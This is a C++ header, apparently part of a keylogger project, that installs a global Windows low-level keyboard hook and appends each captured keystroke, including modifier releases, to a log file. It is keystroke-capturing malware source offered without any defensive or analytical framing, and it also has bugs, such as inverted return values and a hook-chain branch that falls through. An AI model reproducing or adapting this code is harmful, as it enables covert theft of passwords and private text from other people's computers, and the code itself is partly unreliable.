#ifndef _KEYBHOOKS_H_
#define _KEYBHOOKS_H_

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "KeyConstants.h"
#include "Globals.h"
#include <string>

class KeyHooks {
private:
	static std::string keylog;
	static HHOOK eHook;

public:
	
	static LRESULT ourKeyboarProc(int nCode, WPARAM wparam, LPARAM lparam) 
	{
		keylog = "";
		if (nCode < 0)
		{
			CallNextHookEx(eHook, nCode, wparam, lparam);
		}
	
		KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		{
			keylog += Keys::KEYS[kbs->vkCode].Name;
			if (kbs->vkCode == VK_RETURN)
			{
				keylog += "\n";
			}
		}	//format: [SHIFT] [a] [b] [c] [/SHIFT]
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
		{
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL  ||
				key == VK_LCONTROL ||
				key == VK_RCONTROL ||
				key == VK_SHIFT    ||
				key == VK_LSHIFT   ||
				key == VK_RSHIFT   ||
				key == VK_MENU	   ||
				key == VK_LMENU    ||
				key == VK_RMENU    ||
				key == VK_CAPITAL  ||
				key == VK_NUMLOCK  ||
				key == VK_LWIN     ||
				key == VK_RWIN)
			{
				std::string keyName = Keys::KEYS[kbs->vkCode].Name;
				keyName.insert(1, "/");
				keylog += keyName;
			}
		}
	

		if (keylog != "")
		{
			std::ofstream file(GlobalResources::LOGFILE_NAME, std::ios::app);
			file << keylog;
			file.close();
		}
		return	CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	static bool installHook() {
		Helper::writeAppLog("Hook started...");
		eHook = SetWindowsHookEx((int)WH_KEYBOARD_LL, (HOOKPROC)(ourKeyboarProc), (HINSTANCE)GetModuleHandle(NULL), (DWORD)0);
		return eHook == NULL;
	}

	bool uninstallHook() {
		BOOL b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return b;
	}

	bool isHooked() {
		return eHook == NULL;
	}

};

std::string KeyHooks::keylog = "";
HHOOK KeyHooks::eHook = NULL;

#endif	//_KEYBHOOKS_H_